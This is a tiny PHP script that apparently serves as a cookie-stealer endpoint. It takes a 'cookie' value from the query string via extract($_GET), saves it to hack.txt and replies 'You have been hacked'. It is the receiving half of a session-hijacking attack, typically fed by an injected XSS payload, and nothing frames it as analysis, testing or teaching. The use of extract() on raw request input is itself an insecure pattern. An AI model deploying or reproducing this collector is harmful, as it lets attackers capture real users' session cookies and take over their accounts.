<?php
	extract($_GET);
	$filename="hack.txt";
	$f=fopen($filename,"w");
	fwrite($f,$cookie);
	fclose($f);
	echo("You have been hacked");
?>